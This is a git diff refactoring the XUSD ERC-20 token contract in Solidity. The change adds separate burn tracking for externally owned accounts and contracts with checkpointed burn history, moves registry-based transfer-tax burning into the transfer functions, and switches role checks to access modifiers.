@@ -1,26 +1,30 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
-import "./Ownable.sol";
-import "hardhat/console.sol";
-import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20PermitUpgradeable.sol";
-import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
-import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
-import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
-import "./VibeRegistry.sol";
-import "./Access.sol";
 
-/**
- * @title ERC20Base
- * @dev Basic ERC20 implementation with burn functionality and registry integration.
- */
-contract XUSD is Context, IERC20, IERC20Metadata {
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+import "@openzeppelin/contracts/utils/Context.sol";
+import "@openzeppelin/contracts/utils/structs/Checkpoints.sol";
+import "./VibeRegistry.sol";
+import "./AccessorMod.sol";
+
+contract XUSD is Context, IERC20, IERC20Metadata, AccesorMod, Ownable {
+    using Checkpoints for Checkpoints.Trace224;  // Using Checkpoints library for tracking burn history
+
     // Storage
+    mapping(address => uint32[]) private _burnBlockNumbersEOA;
+mapping(address => uint32[]) private _burnBlockNumbersContract;
     mapping(address => uint256) private _balances;
-    mapping(address => uint256) internal _burnBalances;
-        mapping(address => uint256) internal _originBurnBalance;
     mapping(address => mapping(address => uint256)) private _allowances;
+    mapping(address => uint256) internal _contractBurnBalances;
+    mapping(address => uint256) internal _eoaBurnBalances;
+    mapping(address => Checkpoints.Trace224) private _burnCheckpointsEOA;
+    mapping(address => Checkpoints.Trace224) private _burnCheckpointsContract;
+    uint256 internal _totalBurnedEOA;
+    uint256 internal _totalBurnedContract;
+
     uint256 private _totalSupply;
     uint256 internal _totalBurned;
     string private _name;
@@ -28,49 +32,39 @@ contract XUSD is Context, IERC20, IERC20Metadata {
     bool private tradingOpen;
     bool private paid = false;
     bool private swapEnabled = false;
- 
-    VibeRegistry public registry;
-    uint256 private locked = 1;
+    mapping(address => bool) private _isExcludedFromTax;
+    address immutable public burnAddress = 0x0000000000000000000000000000000000000369;
 
-    modifier nonReentrant() virtual {
-        require(locked == 1, "REENTRANCY");
+    VibeRegistry registry;
 
-        locked = 2;
-
-        _;
-
-        locked = 1;
-    }
     // Constructor
- constructor(
+    constructor(
         string memory name_,
         string memory symbol_,
-        uint8 decimals_,
         uint256 initialBalance_,
         address _access
-     
-    )  {
-        require(initialBalance_ > 0, "MyTokenMock: initial supply cannot be zero");
-        access = HierarchicalAccessControl(_access);
-        _mint(_msgSender(), initialBalance_);
-    _name = name_;
-    _symbol = symbol_;
     
+    ) AccesorMod(_access) Ownable(msg.sender) {
+        require(initialBalance_ > 0, "Initial supply cannot be zero");
+ 
+        _name = name_;
+        _symbol = symbol_;
+        _mint(_msgSender(), initialBalance_);
     }
 
-    // View function to return burn balance of a user
-    function burnBalance(address user) public view returns (uint256) {
-        return _burnBalances[user];
+    // View function to return burn balance of a user (Contracts)
+    function burnBalanceContract(address contractAddr) public view returns (uint256) {
+        return _contractBurnBalances[contractAddr];
     }
 
-
-    function burnBalanceOrigin(address user) public view returns (uint256) {
-        return _originBurnBalance[user];
+    // View function to return burn balance of a user (EOAs)
+    function burnBalanceEOA(address user) public view returns (uint256) {
+        return _eoaBurnBalances[user];
     }
 
-    // Returns the total amount burned
+    // Returns the total amount burned (combining EOAs and contracts)
     function totalBurned() external view returns (uint256) {
-        return _totalBurned;
+        return _totalBurnedEOA + _totalBurnedContract;
     }
 
     // Returns the name of the token
@@ -93,131 +87,186 @@ contract XUSD is Context, IERC20, IERC20Metadata {
         return _totalSupply;
     }
 
-
-
     // Returns the balance of a specific account
     function balanceOf(address account) public view virtual override returns (uint256) {
         return _balances[account];
     }
 
-
-    // Returns allowance granted to spender by owner
-    function allowance(address owner, address spender) public view virtual override returns (uint256) {
-        return _allowances[owner][spender];
+    // Returns allowance granted to spender by _owner
+    function allowance(address _owner, address spender) public view virtual override returns (uint256) {
+        return _allowances[_owner][spender];
     }
 
     // Approves a spender
     function approve(address spender, uint256 amount) public virtual override returns (bool) {
-        address owner = _msgSender();
-        _approve(owner, spender, amount);
+        address _owner = _msgSender();
+        _approve(_owner, spender, amount);
         return true;
     }
 
-
-
     // Increase allowance
     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
-        address owner = _msgSender();
-        _approve(owner, spender, allowance(owner, spender) + addedValue);
+        address _owner = _msgSender();
+        _approve(_owner, spender, allowance(_owner, spender) + addedValue);
         return true;
     }
 
     // Decrease allowance
     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
-        address owner = _msgSender();
-        uint256 currentAllowance = allowance(owner, spender);
-        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
+        address _owner = _msgSender();
+        uint256 currentAllowance = allowance(_owner, spender);
+        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
         unchecked {
-            _approve(owner, spender, currentAllowance - subtractedValue);
+            _approve(_owner, spender, currentAllowance - subtractedValue);
         }
         return true;
     }
 
-    // Internal transfer logic
-    function _transfer(address from, address to, uint256 amount) internal virtual {
-        require(from != address(0), "ERC20: transfer from zero address");
-        
-
-        _beforeTokenTransfer(from, to, amount);
-
-        uint256 fromBalance = _balances[from];
-        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
-
-        if(to == address(0)){
- unchecked {
-            _originBurnBalance[tx.origin] += amount;
-            _burnBalances[from] += amount;
-            _totalBurned += amount;
-            _balances[from] = fromBalance - amount;
-            _totalSupply -= amount;
-        }
-
-        }
-        else{
-        unchecked {
-            _balances[from] = fromBalance - amount;
-            _balances[to] += amount;
-        }
-        }
-        emit Transfer(from, to, amount);
-        _afterTokenTransfer(from, to, amount);
-    }
-
     // Internal mint logic
     function _mint(address account, uint256 amount) internal virtual {
-        require(account != address(0), "ERC20: mint to zero address");
-
-        _beforeTokenTransfer(address(0), account, amount);
-
+        require(account != address(0), "Mint to zero address");
         _totalSupply += amount;
         unchecked {
             _balances[account] += amount;
         }
         emit Transfer(address(0), account, amount);
-
-        _afterTokenTransfer(address(0), account, amount);
     }
-
-   
 
     // Approve function
-    function _approve(address owner, address spender, uint256 amount) internal virtual {
-        require(owner != address(0), "ERC20: approve from zero address");
-        require(spender != address(0), "ERC20: approve to zero address");
-
-        _allowances[owner][spender] = amount;
-        emit Approval(owner, spender, amount);
+    function _approve(address _owner, address spender, uint256 amount) internal virtual {
+        require(_owner != address(0), "Approve from zero address");
+        require(spender != address(0), "Approve to zero address");
+        _allowances[_owner][spender] = amount;
+        emit Approval(_owner, spender, amount);
     }
 
-    // Spend allowance function
-    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
-        uint256 currentAllowance = allowance(owner, spender);
-        if (currentAllowance != type(uint256).max) {
-            require(currentAllowance >= amount, "ERC20: insufficient allowance");
-            unchecked {
-                _approve(owner, spender, currentAllowance - amount);
+    // Transfer function with tax deduction and burn logic
+    function transfer(address to, uint256 amount) public virtual nonReentrant override returns (bool) {
+        address _owner = _msgSender();
+        (int fee, uint256 adjustedAmount) = registry.calculateAndSumBasis(to, _owner, tx.origin, msg.sender, amount);
+        if (fee > 0 && !_isExcludedFromTax[_owner] && !_isExcludedFromTax[to]) {
+            uint256 taxAmount = (adjustedAmount * uint256(fee)) / 10000;
+            if (taxAmount > 0) {
+                _transfer(_owner, address(0), taxAmount);  // Burn the tax amount
+                adjustedAmount -= taxAmount;
             }
+        }
+        _transfer(_owner, to, adjustedAmount);
+        return true;
+    }
+
+    // Similar tax handling for transferFrom
+    function transferFrom(address from, address to, uint256 amount) public virtual nonReentrant override returns (bool) {
+        address spender = _msgSender();
+        _spendAllowance(from, spender, amount);
+        (int fee, uint256 adjustedAmount) = registry.calculateAndSumBasis(to, from, tx.origin, spender, amount);
+        if (fee > 0 && !_isExcludedFromTax[from] && !_isExcludedFromTax[to]) {
+            uint256 taxAmount = (adjustedAmount * uint256(fee)) / 10000;
+            if (taxAmount > 0) {
+                _transfer(from, address(0), taxAmount);  // Burn the tax amount
+                adjustedAmount -= taxAmount;
+            }
+        }
+        _transfer(from, to, adjustedAmount);
+        return true;
+    }
+
+    // Internal transfer function
+    function _transfer(address from, address to, uint256 amount) internal virtual {
+        require(from != address(0), "Transfer from zero address");
+
+        if (to == address(0) || to == burnAddress) {
+            // Burning tokens
+            if (isContract(from)) {
+                _contractBurnBalances[from] += amount;
+                _totalBurnedContract += amount;
+                _updateBurnHistoryContract(from, amount);
+            } else {
+                _eoaBurnBalances[tx.origin] += amount;
+                _totalBurnedEOA += amount;
+                _updateBurnHistoryEOA(tx.origin, amount);
+            }
+
+            _burn(from, amount);
+        } else {
+            uint256 fromBalance = _balances[from];
+            require(fromBalance >= amount, "Transfer amount exceeds balance");
+            unchecked {
+                _balances[from] = fromBalance - amount;
+                _balances[to] += amount;
+            }
+            emit Transfer(from, to, amount);
         }
     }
 
-    // Hooks before token transfer
-    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
+    // Internal burn function
+    function _burn(address from, uint256 amount) internal virtual {
+        uint256 fromBalance = _balances[from];
+        require(fromBalance >= amount, "Burn amount exceeds balance");
+        unchecked {
+            _balances[from] = fromBalance - amount;
+            _totalSupply -= amount;
+        }
+        emit Transfer(from, address(0), amount);
+    }
 
-    // Hooks after token transfer
-    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
+    // Burn history tracking for EOAs
+ function _updateBurnHistoryEOA(address user, uint256 amount) internal {
+    uint224 currentBurnAmount = uint224(_eoaBurnBalances[user]);
+    uint224 newBurnAmount = currentBurnAmount + uint224(amount);
+    uint32 blockNumber = uint32(block.number);
     
+    _burnCheckpointsEOA[user].push(blockNumber, newBurnAmount);
+    
+    // Track the block number for the user
+    _burnBlockNumbersEOA[user].push(blockNumber);
+}
 
+    // Burn history tracking for Contracts
+ function _updateBurnHistoryContract(address contractAddress, uint256 amount) internal {
+    uint224 currentBurnAmount = uint224(_contractBurnBalances[contractAddress]);
+    uint224 newBurnAmount = currentBurnAmount + uint224(amount);
+    uint32 blockNumber = uint32(block.number);
 
+    _burnCheckpointsContract[contractAddress].push(blockNumber, newBurnAmount);
+    
+    // Track the block number for the contract
+    _burnBlockNumbersContract[contractAddress].push(blockNumber);
+}
 
+    // View latest burn for EOAs
+    function getLatestBurnEOA(address user) public view returns (uint224) {
+        return _burnCheckpointsEOA[user].latest();
+    }
+    function getFullBurnHistoryEOA(address user) public view returns (uint32[] memory blocks, uint224[] memory burns) {
+    uint32[] memory blockNumbers = _burnBlockNumbersEOA[user];
+    uint224[] memory burnAmounts = new uint224[](blockNumbers.length);
 
-    mapping(address => bool) private _isExcludedFromTax;
+    for (uint256 i = 0; i < blockNumbers.length; i++) {
+        burnAmounts[i] = _burnCheckpointsEOA[user].upperLookup(blockNumbers[i]);
+    }
+    
+    return (blockNumbers, burnAmounts);
+}
 
-    address immutable public burnAddress = 0x0000000000000000000000000000000000000369;
+// Get the full burn history for a contract
+function getFullBurnHistoryContract(address contractAddr) public view returns (uint32[] memory blocks, uint224[] memory burns) {
+    uint32[] memory blockNumbers = _burnBlockNumbersContract[contractAddr];
+    uint224[] memory burnAmounts = new uint224[](blockNumbers.length);
 
-     HierarchicalAccessControl private access;
+    for (uint256 i = 0; i < blockNumbers.length; i++) {
+        burnAmounts[i] = _burnCheckpointsContract[contractAddr].upperLookup(blockNumbers[i]);
+    }
+    
+    return (blockNumbers, burnAmounts);
+}
 
-  
-    // Returns whether the given address is a contract
+    // View latest burn for contracts
+    function getLatestBurnContract(address contractAddr) public view returns (uint224) {
+        return _burnCheckpointsContract[contractAddr].latest();
+    }
+
+    // Utility to check if an address is a contract
     function isContract(address account) internal view returns (bool) {
         uint256 size;
         assembly {
@@ -226,89 +275,8 @@ contract XUSD is Context, IERC20, IERC20Metadata {
         return size > 0;
     }
 
-      function Rewardtransfer(address to, uint256 amount) external   {
-        address _owner = _msgSender();
-       assert(
-            access.hasRank(HierarchicalAccessControl.Rank.CONSUL, msg.sender)
-        );
-        // int fee = registry.calculateAndSumBasis(to, msg.sender, tx.origin, amount);
-
-        // if (fee > 0 && !_isExcludedFromTax[owner] && !_isExcludedFromTax[to]) {
-        //     uint256 taxAmount = (amount * uint256(fee)) / 10000;
-        //     if (taxAmount > 0) {
-        //         _burn(owner, taxAmount);
-        //         _burnBalances[owner] += taxAmount;
-        //         _totalBurned += taxAmount;
-        //         amount -= taxAmount;
-        //     }
-        // }
-
-        _transfer(_owner, to, amount);
-        
-    }
-
-      function setRegistry(address reg) public  {
-                assert(
-            access.hasRank(HierarchicalAccessControl.Rank.SENATOR, msg.sender)
-        );
-        registry = VibeRegistry(reg);
-    }
-
-    // Mint new tokens
-    function mint(address to, uint256 amount) public  {
-          assert(
-            access.hasRank(HierarchicalAccessControl.Rank.CONSUL, msg.sender)
-        );
-        _mint(to, amount);
-    }
-
-
-    // Internal dynamic burn mechanism
-
-
-
-
-    // Overridden transfer function that includes tax
-    function transfer(address to, uint256 amount) public virtual nonReentrant override returns (bool) {
-        address owner = _msgSender();
-        console.logAddress(to);
-        (int fee, uint _amount) = registry.calculateAndSumBasis(to, owner, tx.origin, msg.sender, amount);
-
-        if (fee > 0 && !_isExcludedFromTax[owner] && !_isExcludedFromTax[to]) {
-            uint256 taxAmount = (_amount * uint256(fee)) / 10000;
-            if (taxAmount > 0) {
-             _transfer(owner, address(0), taxAmount);
-          console.logUint(taxAmount);
-               _amount -= taxAmount;
-            }
-        }
-
-        _transfer(owner, to, _amount);
-        return true;
-    }
-
-    // Similar tax handling for transferFrom
-    function transferFrom(address from, address to, uint256 amount) public virtual nonReentrant override returns (bool) {
-        address spender = _msgSender();
-        _spendAllowance(from, spender, amount);
-        (int fee, uint _amount) = registry.calculateAndSumBasis(to, from, tx.origin, spender, amount);
-
-        if (fee > 0 && !_isExcludedFromTax[from] && !_isExcludedFromTax[to]) {
-            uint256 taxAmount = (_amount * uint256(fee)) / 10000;
-            if (taxAmount > 0) {
-             _transfer(from, address(0), taxAmount);
-                     console.logUint(taxAmount);
-            _amount -= taxAmount;
-            }
-        }
-
-        _transfer(from, to, _amount);
-        return true;
-    }
-
-    // Tax and exclusion getters and setters
-
-    function setExclusionFromTax(address account, bool status) internal virtual {
+    // Exclude accounts from tax
+    function setExclusionFromTax(address account, bool status) external onlySenator {
         _isExcludedFromTax[account] = status;
     }
 
@@ -316,5 +284,30 @@ contract XUSD is Context, IERC20, IERC20Metadata {
         return _isExcludedFromTax[account];
     }
 
-  
+    // Set registry contract address
+    function setRegistry(address reg) public onlySenator {
+        require(isContract(reg), "Provided address is not a contract");
+        registry = VibeRegistry(reg);
+    }
+
+    // Reward transfer function
+    function Rewardtransfer(address to, uint256 amount) external onlyConsul nonReentrant {
+        _transfer(_msgSender(), to, amount);
+    }
+
+    // Mint new tokens
+    function mint(address to, uint256 amount) public onlyConsul {
+        _mint(to, amount);
+    }
+
+    // Spend allowance
+    function _spendAllowance(address _owner, address spender, uint256 amount) internal virtual {
+        uint256 currentAllowance = allowance(_owner, spender);
+        if (currentAllowance != type(uint256).max) {
+            require(currentAllowance >= amount, "Insufficient allowance");
+            unchecked {
+                _approve(_owner, spender, currentAllowance - amount);
+            }
+        }
+    }
 }
